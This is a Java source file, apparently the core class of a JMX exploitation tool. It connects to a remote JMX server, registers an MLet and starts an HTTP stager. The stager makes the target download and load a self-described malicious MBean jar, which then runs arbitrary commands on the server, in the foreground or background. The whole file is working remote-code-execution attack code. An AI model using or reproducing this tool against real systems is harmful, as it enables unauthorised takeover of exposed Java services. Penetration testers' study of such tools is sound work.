package de.qtc.jmxexploiter;

import de.qtc.jmxexploiter.JarHandler;
import de.qtc.jmxexploiter.MLetHandler;
import java.net.InetSocketAddress;
import java.util.HashMap;

import javax.management.MBeanServerConnection;
import javax.management.MalformedObjectNameException;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import com.sun.net.httpserver.HttpServer;

public class GreenGrocer {
 
    String jarPath = null;
    String jarName = null;
    String beanClass = null;
    String objectName = null;
    ObjectName beanName = null;
    ObjectName mLetName = null;
    MBeanServerConnection mBeanServer = null;

    public GreenGrocer(String jarPath, String jarName, String beanClass, String objectName, String mLetNameString) throws MalformedObjectNameException
    {
        this.jarPath = jarPath;
        this.jarName = jarName;
        this.beanClass = beanClass;
        this.objectName = objectName;

        this.mLetName = new ObjectName(mLetNameString);
        this.beanName = new ObjectName(this.objectName);
    }

    public void connect(String host, int port, String username, String password, String boundName) 
    {
      try {
          /* Setup of the credentials and the service URL */
          HashMap<String, String[]> environment = new HashMap<String, String[]>();
          String[] credentials = new String[] {username, password};
          environment.put(JMXConnector.CREDENTIALS, credentials);
          JMXServiceURL jmxUrl = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + host + ":" + port +  "/" + boundName);

          /* Connection Attempt */
          System.out.print("[+] Connecting to JMX server... ");
          JMXConnector jmxConnector = JMXConnectorFactory.connect(jmxUrl, environment);
          System.out.println("done!");

          /* Generate MBeanServerConnection */
          System.out.print("[+] Creating MBeanServerConnection... ");
          this.mBeanServer = jmxConnector.getMBeanServerConnection();
          System.out.println("done!\n[+]");

      /* If any of the above one failes, we can terminate the program */
      } catch( Exception e ) {
          System.out.println("failed!");
          System.out.println("[-] Exception was thrown: " + e.toString() + "\n");
          System.exit(1);
      }
    }

    public void registerMLet() 
    {
        try {
            /* First we try to register the MLet for JMX MBean deployment */
            System.out.print("[+] Creating MBean 'MLet' for remote deploymet... ");
            this.mBeanServer.createMBean("javax.management.loading.MLet", null);
            System.out.println("done!\n[+]");

        } catch (javax.management.InstanceAlreadyExistsException e) {
            /* MLet is may already registered. In this case we are done. */
            System.out.println("done!");
            System.out.println("[+] MBean 'MLet' did already exist.\n[+]");

        } catch( Exception e ) {
            /* Ottherwise MLet registration fails and we can stop execution. */
            System.out.println("failed!");
            System.out.println("[-] Exception was thrown: " + e.toString());
            System.exit(1);
        }
    }

    public void unregisterMLet() 
    {
        try {
            /* Trying to unregister the MLet from the JMX endpoint */
            System.out.print("[+] Unregister MBean 'MLet'... ");
            this.mBeanServer.unregisterMBean(mLetName);
            System.out.println("done!");

        } catch (javax.management.InstanceNotFoundException e) {
            /* If no MLet instance was found, we are done. */
            System.out.println("done!");
            System.out.println("[+] MBean 'MLet' did not exist on the JMX server.");

        } catch( Exception e ) {
            /* Otherwise an unexpected exception occured and we have to stop. */
            System.out.println("failed!");
            System.out.println("[-] Exception was thrown: " + e.toString());
            System.exit(1);
        }
    }

    public void jmxStatus() 
    {
        try {
            /* First we check if the MLet is registered on the JMX endpoint */
            System.out.print("[+] Getting Status of MLet... ");
            if( this.mBeanServer.isRegistered(mLetName) ) {
                System.out.println("done!");
                System.out.println("[+]\tMLet is registered on the JMX server.");
            } else {
              System.out.println("done!");
              System.out.println("[+]\tMLet is not registered on the JMX server.");
            }

            /* Then we check if the malicious Bean is registered on the JMX endpoint */
            System.out.print("[+] Getting Status of malicious Bean... ");
            if( this.mBeanServer.isRegistered(this.beanName) ) {
              System.out.println("done!");
              System.out.println("[+]\tmalicious Bean is registered on the JMX server.");
            } else {
              System.out.println("done!");
              System.out.println("[+]\tmalicious Bean is not registered on the JMX server.");
            }

         } catch( Exception e ) {
            /* During the checks no exception is expected. So we exit if we encounter one */
            System.out.println("failed!");
            System.err.println("[-] Exception was thrown: " + e.toString());
            System.exit(1);
         }
    }

    public void registerBean(String stagerHost, String stagerPort, boolean remoteStager) 
    {
        try {
            /* If the malicious Bean is already registered, we are done */
            if( this.mBeanServer.isRegistered(this.beanName) ) {
                System.out.println("[+] malicious Bean seems already be registered");
                return;

            /* Otherwise we have to create it */
            } else {
                try {
                    /* The server may already knows the codebase and registration is done right here */
                    mBeanServer.createMBean(this.beanClass, this.beanName);
                    System.out.println("[+] Malicious Bean is not registered, but known by the server");
                    System.out.println("[+] Instance created!");
                    return;

                } catch( Exception e ) {
                    /* More likely is, that we have to deploy the Bean over our HTTP listener */
                    System.out.println("[+] Malicious Bean seems not to be registered on the server");
                    System.out.println("[+] Starting registration process");
                }
            }

            /* The stager server might run on a different machine, in this case we can skip server creation */
            HttpServer payloadServer = null;
            if( ! remoteStager )
                payloadServer = this.startStagerServer(stagerHost, stagerPort);

            /* In any case we need to invoke getMBeansFromURL to deploy our malicious bean */
            Object res = this.mBeanServer.invoke(this.mLetName, "getMBeansFromURL",
                                  new Object[] { String.format("http://%s:%s/mlet", stagerHost, stagerPort) },
                                  new String[] { String.class.getName() }
                                  );

            /* If we did not started the server we can stop it here */
            if( ! remoteStager )
                payloadServer.stop(0);

            /* At this stage the bean should have bean registered on the server */
            if( mBeanServer.isRegistered(this.beanName) ) {
                System.out.println("[+] malicious Bean was successfully registered");

            /* Otherwise something unecpexted has happened */
            } else {
                System.err.println("[-] malicious Bean does still not exist on the server");
                System.err.println("[-] Registration process failed.");
                System.err.println("[-] The following object was returned:" + res);
                System.exit(1);
            }

         } catch( Exception e ) {
             System.err.println("[-] Error while registering malicious Bean.");
             System.err.println("[-] The following exception was thrown: " + e.toString());
             System.exit(1);
        }
    }    

    public void unregisterBean() 
    {
        /* Just try to unregister the bean, even if it is not registered */ 
        try {
            System.out.print("[+] Unregister malicious bean... ");
            this.mBeanServer.unregisterMBean(this.beanName);
            System.out.println("done!");

        /* If no instance for we bean was found, we are also done */
        } catch (javax.management.InstanceNotFoundException e) {
            System.out.println("done!");
            System.out.println("[+] Malicious Bean did not exist on the JMX server.");

        } catch( Exception e ) {
            System.out.println("failed!");
            System.out.println("[-] Exception was thrown: " + e.toString());
            System.exit(1);
        }
    }

    public void ping() 
    {
        try {
            System.out.print("[+] Sending ping to the server... ");
            Object response = this.mBeanServer.invoke(this.beanName, "ping", null, null);
            System.out.println("done!");
            System.out.println("[+] Servers answer is: " + response);

        } catch( Exception e ) {
            System.out.println("failed!");
            System.out.println("[-] Exception was thrown: " + e.toString());
            System.exit(1);
        }
    }

    public String executeCommand(String command, boolean verbose) 
    {
        try {
            System.out.print("[+] Sending command '" + command + "' to the server... ");
            Object response = this.mBeanServer.invoke(this.beanName, "executeCommand", new Object[]{ command }, new String[]{ String.class.getName() });
            System.out.println("done!");
            
            if(verbose)
                System.out.print("[+] Servers answer is: " + response);
            return (String)response;

        } catch( Exception e ) {
            System.out.println("failed!");
            System.out.println("[-] Exception was thrown: " + e.toString());
            System.exit(1);
        }
		return "Unexpected Error";
    }

    public String executeCommandBackground(String command, boolean verbose)
    {
        try {
            System.out.print("[+] Sending command '" + command + "' to the server... ");
            Object response = this.mBeanServer.invoke(this.beanName, "executeCommandBackground", new Object[]{ command }, new String[]{ String.class.getName() });
            System.out.println("done!");

            if(verbose)
                System.out.print("[+] Servers answer is: " + response);
            return (String)response;

        } catch( Exception e ) {
            System.out.println("failed!");
            System.out.println("[-] Exception was thrown: " + e.toString());
            System.exit(1);
        }
		return "Unexpected Error";
    }

    public HttpServer startStagerServer(String stagerHost, String stagerPort) 
    {
        HttpServer server = null;
        try {
            /* First we create a new HttpServer object */
            server = HttpServer.create(new InetSocketAddress(stagerHost, Integer.valueOf(stagerPort)), 0);
            System.out.println("[+] \tCreating HTTP server on " + stagerHost + ":" + stagerPort);
    
            /* Then we register an MLetHandler for requests on the endpoint /mlet */
            System.out.print("[+] \t\tCreating MLetHandler for endpoint /mlet... ");
            server.createContext("/mlet", new MLetHandler(stagerHost, stagerPort, this.beanClass, this.jarName, this.objectName));
            System.out.println("done!");
    
            /* Then we register a jar handler for requests that target our jarName */
            System.out.print("[+] \t\tCreating JarHandler for endpoint /" + this.jarName + "... ");
            server.createContext("/" + this.jarName, new JarHandler(this.jarName, this.jarPath));
            System.out.println("done!");
    
            server.setExecutor(null); 
    
            System.out.print("[+]\t\tStarting the HTTP server... ");
            server.start();
            System.out.println("done!\n[+]");
    
        } catch (Exception e) {
            System.out.println("failed!");
            System.out.println("[-] Exception was thrown: " + e.toString() + "\n");
            System.exit(1);
        }
    
        return server;
    }
}
